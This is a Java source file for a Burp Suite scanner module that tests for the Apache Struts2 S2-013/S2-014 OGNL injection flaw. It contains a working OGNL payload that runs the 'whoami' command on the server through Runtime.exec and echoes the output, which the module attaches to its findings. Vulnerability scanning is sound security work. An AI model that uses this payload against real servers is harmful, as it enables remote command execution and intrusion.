package module.java.vul;

import burp.*;
import module.Util;

import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Arrays;

public class S2_013_014 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};
    public String poc =
        "${" +
        "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
        "#out.print(\"" + injectMark[0] + "\")," +
        "#out.print(\"" + injectMark[1] + "\")," +
        "#out.flush()," +
        "#out.close()" +
        "}";
    public String exp =
        "${" +
        "#_memberAccess[\"allowStaticMethodAccess\"]=true," +
        "#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()," +
        "#b=new java.io.InputStreamReader(#a)," +
        "#c=new java.io.BufferedReader(#b)," +
        "#d=new char[50000]," +
        "#c.read(#d)," +
        "#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter()," +
        "#out.println(new java.lang.String(#d))," +
        "#out.close()" +
        "}";

    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        ArrayList<IParameter> iParameters = new ArrayList<>();
        iParameters.add(helpers.buildParameter(Util.getRandomString(8), URLEncoder.encode(poc), (byte)0));
        iParameters.add(helpers.buildParameter(Util.getRandomString(8), URLEncoder.encode(poc), (byte)1));

        for (IParameter newParameter: iParameters) {
            byte[] newRequest = helpers.updateParameter(iHttpRequestResponse.getRequest(), newParameter);
            IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
            byte[] response = newHttpRequestResponse.getResponse();
            IResponseInfo newResponseInfo = helpers.analyzeResponse(response);
            byte[] body = Arrays.copyOfRange(response, newResponseInfo.getBodyOffset(), response.length);

            String bodyText = new String(body);
            if (bodyText.contains(randomMark)) {
                this.iHttpRequestResponse = newHttpRequestResponse;
                this.detail = URLEncoder.encode(exp);
                return creatCustomScanIssue();
            }
        }
        return null;
    }

}
